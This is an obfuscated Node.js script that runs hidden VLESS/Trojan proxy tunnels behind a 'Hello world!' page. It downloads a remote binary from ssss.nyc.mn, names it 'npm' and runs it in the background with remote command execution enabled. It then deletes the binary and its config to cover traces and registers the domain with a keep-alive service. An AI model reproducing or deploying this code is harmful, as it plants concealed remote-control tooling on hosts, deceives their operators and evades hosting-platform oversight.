const _0x54d62c=_0x55ff;(function(_0x338556,_0x4389ce){const _0x4c9c13=_0x55ff,_0x5db970=_0x338556();while(!![]){try{const _0x14cab0=parseInt(_0x4c9c13(0x1ec))/0x1*(parseInt(_0x4c9c13(0x1f5))/0x2)+parseInt(_0x4c9c13(0x219))/0x3+parseInt(_0x4c9c13(0x1f4))/0x4*(-parseInt(_0x4c9c13(0x226))/0x5)+parseInt(_0x4c9c13(0x1fb))/0x6+parseInt(_0x4c9c13(0x1c9))/0x7+-parseInt(_0x4c9c13(0x1d2))/0x8*(parseInt(_0x4c9c13(0x1ed))/0x9)+-parseInt(_0x4c9c13(0x1cc))/0xa;if(_0x14cab0===_0x4389ce)break;else _0x5db970['push'](_0x5db970['shift']());}catch(_0x5cfa8f){_0x5db970['push'](_0x5db970['shift']());}}}(_0x1052,0x3020f));const os=require('os'),http=require(_0x54d62c(0x212)),fs=require('fs'),axios=require(_0x54d62c(0x222)),net=require(_0x54d62c(0x1f1)),path=require('path'),crypto=require(_0x54d62c(0x1dc)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x54d62c(0x21f)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x54d62c(0x1e2)][_0x54d62c(0x1cb)]||_0x54d62c(0x1c2),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x54d62c(0x1e2)][_0x54d62c(0x1ca)]||'',NEZHA_KEY=process[_0x54d62c(0x1e2)][_0x54d62c(0x1db)]||'',DOMAIN=process[_0x54d62c(0x1e2)][_0x54d62c(0x21a)]||'1234.abc.com',AUTO_ACCESS=process['env'][_0x54d62c(0x1c0)]||![],WSPATH=process['env']['WSPATH']||UUID[_0x54d62c(0x1b7)](0x0,0x8),SUB_PATH=process[_0x54d62c(0x1e2)][_0x54d62c(0x223)]||_0x54d62c(0x1fe),NAME=process[_0x54d62c(0x1e2)][_0x54d62c(0x1e4)]||_0x54d62c(0x1cd),PORT=process[_0x54d62c(0x1e2)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x175f73=_0x54d62c;try{const _0x870321=await axios['get']('https://api.ip.sb/geoip'),_0x32dc2d=_0x870321[_0x175f73(0x1be)];ISP=(_0x32dc2d[_0x175f73(0x1b8)]+'-'+_0x32dc2d['isp'])[_0x175f73(0x1e7)](/ /g,'_');}catch(_0x487cde){ISP=_0x175f73(0x1f7);}};GetISP();const httpServer=http['createServer']((_0x50d673,_0x9f869c)=>{const _0x19ba26=_0x54d62c;if(_0x50d673[_0x19ba26(0x1d1)]==='/'){const _0xed1cd=path[_0x19ba26(0x1e3)](__dirname,_0x19ba26(0x1af));fs[_0x19ba26(0x1d9)](_0xed1cd,_0x19ba26(0x201),(_0x1b9385,_0xa108f8)=>{const _0x192efc=_0x19ba26;if(_0x1b9385){_0x9f869c[_0x192efc(0x1bf)](0xc8,{'Content-Type':'text/html'}),_0x9f869c[_0x192efc(0x1e1)](_0x192efc(0x1ad));return;}_0x9f869c[_0x192efc(0x1bf)](0xc8,{'Content-Type':'text/html'}),_0x9f869c[_0x192efc(0x1e1)](_0xa108f8);});return;}else{if(_0x50d673['url']==='/'+SUB_PATH){const _0x5af237=NAME?NAME+'-'+ISP:ISP,_0xd2456f=_0x19ba26(0x20c)+UUID+'@'+DOMAIN+_0x19ba26(0x213)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x19ba26(0x205)+WSPATH+'#'+_0x5af237,_0x346e53=_0x19ba26(0x215)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x19ba26(0x1df)+DOMAIN+_0x19ba26(0x205)+WSPATH+'#'+_0x5af237,_0x227359=_0xd2456f+'\x0a'+_0x346e53,_0x250cbc=Buffer[_0x19ba26(0x1ae)](_0x227359)[_0x19ba26(0x1f2)](_0x19ba26(0x1d4));_0x9f869c[_0x19ba26(0x1bf)](0xc8,{'Content-Type':'text/plain'}),_0x9f869c[_0x19ba26(0x1e1)](_0x250cbc+'\x0a');}else _0x9f869c[_0x19ba26(0x1bf)](0x194,{'Content-Type':_0x19ba26(0x216)}),_0x9f869c[_0x19ba26(0x1e1)](_0x19ba26(0x1b3));}}),wss=new WebSocket[(_0x54d62c(0x1bc))]({'server':httpServer}),uuid=UUID[_0x54d62c(0x1e7)](/-/g,''),DNS_SERVERS=[_0x54d62c(0x1f0),'1.1.1.1'];function _0x55ff(_0x4e3650,_0x150471){_0x4e3650=_0x4e3650-0x1ad;const _0x105235=_0x1052();let _0x55ffa1=_0x105235[_0x4e3650];return _0x55ffa1;}function resolveHost(_0x441f8b){return new Promise((_0x9d9981,_0x3284bb)=>{const _0x82c39=_0x55ff;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x82c39(0x20a)](_0x441f8b)){_0x9d9981(_0x441f8b);return;}let _0x24588c=0x0;function _0x4b4294(){const _0x26fff3=_0x82c39;if(_0x24588c>=DNS_SERVERS[_0x26fff3(0x1eb)]){_0x3284bb(new Error(_0x26fff3(0x1c4)+_0x441f8b+_0x26fff3(0x1bd)));return;}const _0x2188db=DNS_SERVERS[_0x24588c];_0x24588c++;const _0x2bdb0a=_0x26fff3(0x225)+encodeURIComponent(_0x441f8b)+_0x26fff3(0x20f);axios[_0x26fff3(0x1f3)](_0x2bdb0a,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x26fff3(0x1b1)](_0x1626c0=>{const _0x166bbb=_0x26fff3,_0x35aa80=_0x1626c0[_0x166bbb(0x1be)];if(_0x35aa80[_0x166bbb(0x1b9)]===0x0&&_0x35aa80[_0x166bbb(0x1d8)]&&_0x35aa80[_0x166bbb(0x1d8)]['length']>0x0){const _0x50ca7e=_0x35aa80[_0x166bbb(0x1d8)][_0x166bbb(0x209)](_0x572ffc=>_0x572ffc[_0x166bbb(0x1f9)]===0x1);if(_0x50ca7e){_0x9d9981(_0x50ca7e['data']);return;}}_0x4b4294();})[_0x26fff3(0x204)](_0x8267f0=>{_0x4b4294();});}_0x4b4294();});}function handleVlessConnection(_0x3d59ca,_0x1352ae){const _0x37732f=_0x54d62c,[_0x14e116]=_0x1352ae,_0xee7b7e=_0x1352ae[_0x37732f(0x1b7)](0x1,0x11);if(!_0xee7b7e['every']((_0x3b70e4,_0x50539f)=>_0x3b70e4==parseInt(uuid[_0x37732f(0x1da)](_0x50539f*0x2,0x2),0x10)))return![];let _0x20d3a9=_0x1352ae[_0x37732f(0x1b7)](0x11,0x12)[_0x37732f(0x20b)]()+0x13;const _0x416d2e=_0x1352ae[_0x37732f(0x1b7)](_0x20d3a9,_0x20d3a9+=0x2)[_0x37732f(0x1cf)](0x0),_0xca17e0=_0x1352ae[_0x37732f(0x1b7)](_0x20d3a9,_0x20d3a9+=0x1)[_0x37732f(0x20b)](),_0x298d30=_0xca17e0==0x1?_0x1352ae['slice'](_0x20d3a9,_0x20d3a9+=0x4)[_0x37732f(0x1e3)]('.'):_0xca17e0==0x2?new TextDecoder()[_0x37732f(0x1b0)](_0x1352ae[_0x37732f(0x1b7)](_0x20d3a9+0x1,_0x20d3a9+=0x1+_0x1352ae['slice'](_0x20d3a9,_0x20d3a9+0x1)[_0x37732f(0x20b)]())):_0xca17e0==0x3?_0x1352ae[_0x37732f(0x1b7)](_0x20d3a9,_0x20d3a9+=0x10)['reduce']((_0x5ed03c,_0x567e6a,_0x2281d4,_0x115405)=>_0x2281d4%0x2?_0x5ed03c['concat'](_0x115405[_0x37732f(0x1b7)](_0x2281d4-0x1,_0x2281d4+0x1)):_0x5ed03c,[])[_0x37732f(0x1d6)](_0x52ce51=>_0x52ce51[_0x37732f(0x1cf)](0x0)['toString'](0x10))[_0x37732f(0x1e3)](':'):'';_0x3d59ca[_0x37732f(0x21c)](new Uint8Array([_0x14e116,0x0]));const _0x1a7eb0=createWebSocketStream(_0x3d59ca);return resolveHost(_0x298d30)[_0x37732f(0x1b1)](_0x1d7fe6=>{const _0x31b020=_0x37732f;net[_0x31b020(0x1c7)]({'host':_0x1d7fe6,'port':_0x416d2e},function(){const _0x4676e6=_0x31b020;this[_0x4676e6(0x207)](_0x1352ae[_0x4676e6(0x1b7)](_0x20d3a9)),_0x1a7eb0['on'](_0x4676e6(0x217),()=>{})[_0x4676e6(0x1ee)](this)['on']('error',()=>{})['pipe'](_0x1a7eb0);})['on'](_0x31b020(0x217),()=>{});})[_0x37732f(0x204)](_0x1629bd=>{const _0x5556de=_0x37732f;net[_0x5556de(0x1c7)]({'host':_0x298d30,'port':_0x416d2e},function(){const _0x4d06cd=_0x5556de;this[_0x4d06cd(0x207)](_0x1352ae['slice'](_0x20d3a9)),_0x1a7eb0['on']('error',()=>{})['pipe'](this)['on'](_0x4d06cd(0x217),()=>{})[_0x4d06cd(0x1ee)](_0x1a7eb0);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x370236,_0x5d42b1){const _0x40a7bb=_0x54d62c;try{if(_0x5d42b1['length']<0x3a)return![];const _0x2a232e=_0x5d42b1[_0x40a7bb(0x1b7)](0x0,0x38)[_0x40a7bb(0x1f2)](),_0x5ec297=[UUID];let _0x438fd1=null;for(const _0x4f05a7 of _0x5ec297){const _0x56b661=crypto[_0x40a7bb(0x1ba)]('sha224')[_0x40a7bb(0x1b6)](_0x4f05a7)[_0x40a7bb(0x1c8)](_0x40a7bb(0x202));if(_0x56b661===_0x2a232e){_0x438fd1=_0x4f05a7;break;}}if(!_0x438fd1)return![];let _0xa2797b=0x38;_0x5d42b1[_0xa2797b]===0xd&&_0x5d42b1[_0xa2797b+0x1]===0xa&&(_0xa2797b+=0x2);const _0x239ff6=_0x5d42b1[_0xa2797b];if(_0x239ff6!==0x1)return![];_0xa2797b+=0x1;const _0x44cb11=_0x5d42b1[_0xa2797b];_0xa2797b+=0x1;let _0x2cc12c,_0x27f854;if(_0x44cb11===0x1)_0x2cc12c=_0x5d42b1['slice'](_0xa2797b,_0xa2797b+0x4)[_0x40a7bb(0x1e3)]('.'),_0xa2797b+=0x4;else{if(_0x44cb11===0x3){const _0x274d38=_0x5d42b1[_0xa2797b];_0xa2797b+=0x1,_0x2cc12c=_0x5d42b1[_0x40a7bb(0x1b7)](_0xa2797b,_0xa2797b+_0x274d38)['toString'](),_0xa2797b+=_0x274d38;}else{if(_0x44cb11===0x4)_0x2cc12c=_0x5d42b1['slice'](_0xa2797b,_0xa2797b+0x10)[_0x40a7bb(0x1e6)]((_0x1566a0,_0x135884,_0x40c352,_0x256b5b)=>_0x40c352%0x2?_0x1566a0[_0x40a7bb(0x214)](_0x256b5b['slice'](_0x40c352-0x1,_0x40c352+0x1)):_0x1566a0,[])[_0x40a7bb(0x1d6)](_0x26ae5e=>_0x26ae5e[_0x40a7bb(0x1cf)](0x0)[_0x40a7bb(0x1f2)](0x10))[_0x40a7bb(0x1e3)](':'),_0xa2797b+=0x10;else return![];}}_0x27f854=_0x5d42b1[_0x40a7bb(0x1cf)](_0xa2797b),_0xa2797b+=0x2;_0xa2797b<_0x5d42b1[_0x40a7bb(0x1eb)]&&_0x5d42b1[_0xa2797b]===0xd&&_0x5d42b1[_0xa2797b+0x1]===0xa&&(_0xa2797b+=0x2);const _0x36782d=createWebSocketStream(_0x370236);return resolveHost(_0x2cc12c)['then'](_0x487981=>{const _0x1709d7=_0x40a7bb;net[_0x1709d7(0x1c7)]({'host':_0x487981,'port':_0x27f854},function(){const _0x468d65=_0x1709d7;_0xa2797b<_0x5d42b1[_0x468d65(0x1eb)]&&this[_0x468d65(0x207)](_0x5d42b1[_0x468d65(0x1b7)](_0xa2797b)),_0x36782d['on']('error',()=>{})[_0x468d65(0x1ee)](this)['on']('error',()=>{})[_0x468d65(0x1ee)](_0x36782d);})['on'](_0x1709d7(0x217),()=>{});})[_0x40a7bb(0x204)](_0x357459=>{const _0x4d94e8=_0x40a7bb;net['connect']({'host':_0x2cc12c,'port':_0x27f854},function(){const _0x53bf04=_0x55ff;_0xa2797b<_0x5d42b1[_0x53bf04(0x1eb)]&&this['write'](_0x5d42b1['slice'](_0xa2797b)),_0x36782d['on'](_0x53bf04(0x217),()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x36782d);})['on'](_0x4d94e8(0x217),()=>{});}),!![];}catch(_0x346171){return![];}}wss['on']('connection',(_0x5ee913,_0x6b1d05)=>{const _0x3e5ab7=_0x54d62c,_0x2ab69e=_0x6b1d05['url']||'';_0x5ee913[_0x3e5ab7(0x1d0)](_0x3e5ab7(0x227),_0x20dd3d=>{const _0xc3b460=_0x3e5ab7;if(_0x20dd3d['length']>0x11&&_0x20dd3d[0x0]===0x0){const _0x3ed2f4=_0x20dd3d[_0xc3b460(0x1b7)](0x1,0x11),_0x323ceb=_0x3ed2f4['every']((_0x2d64f3,_0x108daf)=>_0x2d64f3==parseInt(uuid[_0xc3b460(0x1da)](_0x108daf*0x2,0x2),0x10));if(_0x323ceb){!handleVlessConnection(_0x5ee913,_0x20dd3d)&&_0x5ee913[_0xc3b460(0x200)]();return;}}!handleTrojanConnection(_0x5ee913,_0x20dd3d)&&_0x5ee913[_0xc3b460(0x200)]();})['on'](_0x3e5ab7(0x217),()=>{});});const getDownloadUrl=()=>{const _0x34684e=_0x54d62c,_0x2f44a4=os[_0x34684e(0x203)]();return _0x2f44a4===_0x34684e(0x1c5)||_0x2f44a4===_0x34684e(0x1d3)||_0x2f44a4==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x34684e(0x21b):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x3e09f6=_0x54d62c;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3c3a18=getDownloadUrl(),_0x47a2bf=await axios({'method':_0x3e09f6(0x1f3),'url':_0x3c3a18,'responseType':_0x3e09f6(0x1fa)}),_0x399e1d=fs[_0x3e09f6(0x1b4)](_0x3e09f6(0x1f6));return _0x47a2bf[_0x3e09f6(0x1be)][_0x3e09f6(0x1ee)](_0x399e1d),new Promise((_0x3d11b1,_0x364c5d)=>{_0x399e1d['on']('finish',()=>{const _0x4e9bdd=_0x55ff;console[_0x4e9bdd(0x1e5)](_0x4e9bdd(0x218)),exec(_0x4e9bdd(0x1d5),_0x2c1cea=>{if(_0x2c1cea)_0x364c5d(_0x2c1cea);_0x3d11b1();});}),_0x399e1d['on']('error',_0x364c5d);});}catch(_0x4c7b3a){throw _0x4c7b3a;}},runnz=async()=>{const _0x3ecc66=_0x54d62c;try{const _0x3f2a4a=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x3ecc66(0x210)});if(_0x3f2a4a[_0x3ecc66(0x1ce)]()!==''){console[_0x3ecc66(0x1e5)](_0x3ecc66(0x1ef));return;}}catch(_0x2df578){}await downloadFile();let _0x37e89f='',_0x7e45e4=[_0x3ecc66(0x1c6),_0x3ecc66(0x1dd),_0x3ecc66(0x208),_0x3ecc66(0x1bb),'2083',_0x3ecc66(0x1b5)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x335848=_0x7e45e4[_0x3ecc66(0x1e9)](NEZHA_PORT)?_0x3ecc66(0x20e):'';_0x37e89f=_0x3ecc66(0x1f8)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3ecc66(0x221)+NEZHA_KEY+'\x20'+_0x335848+_0x3ecc66(0x1c3);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x53c628=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x24dea0=_0x7e45e4[_0x3ecc66(0x1e9)](_0x53c628)?_0x3ecc66(0x224):_0x3ecc66(0x1de),_0x107953=_0x3ecc66(0x1e0)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x3ecc66(0x1e8)+_0x24dea0+_0x3ecc66(0x1b2)+UUID;fs[_0x3ecc66(0x220)]('config.yaml',_0x107953);}_0x37e89f=_0x3ecc66(0x211);}else{console['log'](_0x3ecc66(0x206));return;}}try{exec(_0x37e89f,{'shell':'/bin/bash'},_0x472560=>{const _0x121fda=_0x3ecc66;if(_0x472560)console[_0x121fda(0x217)](_0x121fda(0x1fd),_0x472560);else console[_0x121fda(0x1e5)](_0x121fda(0x1ea));});}catch(_0xac824d){console[_0x3ecc66(0x217)](_0x3ecc66(0x1ff)+_0xac824d);}};function _0x1052(){const _0x2bcc18=['readUInt16BE','once','url','8wTpumN','arm64','base64','chmod\x20+x\x20npm','map','Server\x20is\x20running\x20on\x20port\x20','Answer','readFile','substr','NEZHA_KEY','crypto','8443','false','&fp=chrome&type=ws&host=','client_secret:\x20','end','env','join','NAME','log','reduce','replace','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','includes','npm\x20is\x20running','length','71qAhlVa','1394703kPgzaV','pipe','npm\x20is\x20already\x20running,\x20skip\x20running...','8.8.4.4','net','toString','get','90956AvaiuO','1794kifNGu','npm','Unknown','setsid\x20nohup\x20./npm\x20-s\x20','type','stream','2075478uLJrnV','listen','npm\x20running\x20error:','sub','error:\x20','close','utf8','hex','arch','catch','&path=%2F','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','write','2096','find','test','readUInt8','vless://','unlink','--tls','&type=A','utf-8','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','http',':443?encryption=none&security=tls&sni=','concat','trojan://','text/plain','error','npm\x20download\x20successfully','315726sffWMz','DOMAIN','https://amd64.ssss.nyc.mn/v1','send','config.yaml','Automatic\x20Access\x20Task\x20added\x20successfully','child_process','writeFileSync','\x20-p\x20','axios','SUB_PATH','true','https://dns.google/resolve?name=','15axhwmT','message','Hello\x20world!','from','index.html','decode','then','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Not\x20Found\x0a','createWriteStream','2053','update','slice','country_code','Status','createHash','2087','Server','\x20with\x20all\x20DNS\x20servers','data','writeHead','AUTO_ACCESS','application/json','566efe25-423f-4d16-99fc-01f9c833f576','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Failed\x20to\x20resolve\x20','arm','443','connect','digest','11949OsLgPu','NEZHA_PORT','UUID','962300kwDgfT','Hug','trim'];_0x1052=function(){return _0x2bcc18;};return _0x1052();}async function addAccessTask(){const _0x32edce=_0x54d62c;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2042ea='https://'+DOMAIN;try{const _0x42bd42=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x2042ea},{'headers':{'Content-Type':_0x32edce(0x1c1)}});console['log'](_0x32edce(0x21e));}catch(_0x1126f1){}}const delFiles=()=>{const _0x54ccb7=_0x54d62c;fs[_0x54ccb7(0x20d)]('npm',()=>{}),fs[_0x54ccb7(0x20d)](_0x54ccb7(0x21d),()=>{});};httpServer[_0x54d62c(0x1fc)](PORT,()=>{const _0x1c9e19=_0x54d62c;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x1c9e19(0x1e5)](_0x1c9e19(0x1d7)+PORT);});
